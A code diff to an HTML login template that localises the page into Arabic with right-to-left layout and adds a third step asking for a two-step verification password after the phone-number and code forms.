@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <title>Login</title>
@@ -21,15 +21,22 @@
 
 {% if step == "phone" %}
 <form method="post" action="/send_code">
-<input name="phone" placeholder="Phone">
-<button class="btn">Send Code</button>
+<input name="phone" placeholder="رقم الجوال مع رمز الدولة">
+<button class="btn">إرسال الكود</button>
 </form>
 {% endif %}
 
 {% if step == "code" %}
 <form method="post" action="/verify">
-<input name="code" placeholder="Code">
-<button class="btn">Verify</button>
+<input name="code" placeholder="كود التحقق">
+<button class="btn">تحقق</button>
+</form>
+{% endif %}
+
+{% if step == "password" %}
+<form method="post" action="/password">
+<input name="password" type="password" placeholder="كلمة مرور التحقق بخطوتين">
+<button class="btn">دخول</button>
 </form>
 {% endif %}
 
